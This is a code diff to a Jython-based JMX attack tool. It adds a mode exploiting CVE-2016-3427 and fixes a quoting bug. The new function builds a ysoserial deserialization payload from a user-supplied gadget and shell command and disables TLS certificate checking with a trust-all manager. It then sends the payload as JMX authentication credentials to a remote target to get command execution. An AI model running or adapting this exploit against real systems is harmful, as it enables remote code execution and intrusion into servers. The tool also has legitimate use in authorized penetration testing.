@@ -51,7 +51,7 @@ def jmxmp_url(args):
         print "[-] Example: java -cp jython.jar:jars/opendmk_jmxremote_optional_jar-1.0-b01-ea.jar org.python.util.jython mjet.py ..."
         sys.exit(1)
 
-    print "[+] Using opendmk_jmxremote_optional_jar-1.0-b01-ea.jar
+    print "[+] Using opendmk_jmxremote_optional_jar-1.0-b01-ea.jar"
         
     from javax.management.remote import JMXServiceURL
     jmx_url = JMXServiceURL("service:jmx:jmxmp://" +
@@ -435,6 +435,48 @@ def deserializationMode(args):
 
 ### /DESERIALIZATION MODE ###
 
+### cve_2016_3427 MODE ###
+
+def cve_2016_3427Mode(args):
+    if not os.path.isfile('./jars/ysoserial.jar'):
+        print "[-] Error: Did not find ysoserial.jar in jars directory. Please download it from https://github.com/frohoff/ysoserial and move it in the jars directory"
+        sys.exit(1)
+
+    sys.path.append("./jars/ysoserial.jar")
+    print "[+] Added ysoserial API capacities"
+
+    from ysoserial.payloads.ObjectPayload import Utils
+    payload_object = Utils.makePayloadObject(args.gadget, args.cmd)
+
+    trust_managers = array([TrustAllX509TrustManager()], TrustManager)
+
+    sc = SSLContext.getInstance("SSL")
+    sc.init(None, trust_managers, None)
+    SSLContext.setDefault(sc)
+
+    from javax.management.remote import JMXConnector
+    from javax.management.remote import JMXConnectorFactory
+
+    jmx_url = jxmrmi_url(args)
+
+    print "[+] Connecting to: " + str(jmx_url)
+    try:
+        environment = {JMXConnector.CREDENTIALS: payload_object}
+        jmx_connector = JMXConnectorFactory.connect(jmx_url, environment)
+    except:
+        if "java.io.InvalidClassException: filter status: REJECTED" in str(sys.exc_info()):
+            print "[-] Not vulnerable"
+        elif "Credentials should be String[]" in str(sys.exc_info()):
+            print "[+] Object was deserialized, target could be vulnerable"
+        
+        print "[?]: Returned error: "
+        print str(sys.exc_info())
+
+    print "[+] Done"
+
+
+### /cve_2016_3427 MODE ###
+
 
 ### Proxy for localhost bypass ###
 
@@ -516,6 +558,9 @@ def arg_webserver_mode(args):
 
 def arg_deserialization_mode(args):
     deserializationMode(args)
+
+def arg_cve_2016_3427_mode(args):
+    cve_2016_3427Mode(args)
 
 
 # print header
@@ -606,6 +651,14 @@ deserialize_subparser.add_argument(
     'gadget', help='gadget as provided by ysoserial, e.g., CommonsCollections6')
 deserialize_subparser.add_argument('cmd', help='command to be executed')
 deserialize_subparser.set_defaults(func=arg_deserialization_mode)
+
+# CVE-2016-3427 mode
+cve_2016_3427_subparser = subparsers.add_parser(
+    'cve-2016-3427', help='Sends a ysoserial payload to JMX authentication (CVE-2016-3427)')
+cve_2016_3427_subparser.add_argument(
+    'gadget', help='gadget as provided by ysoserial, e.g., CommonsCollections6')
+cve_2016_3427_subparser.add_argument('cmd', help='command to be executed')
+cve_2016_3427_subparser.set_defaults(func=arg_cve_2016_3427_mode)
 
 # Store the user args
 args = parser.parse_args()
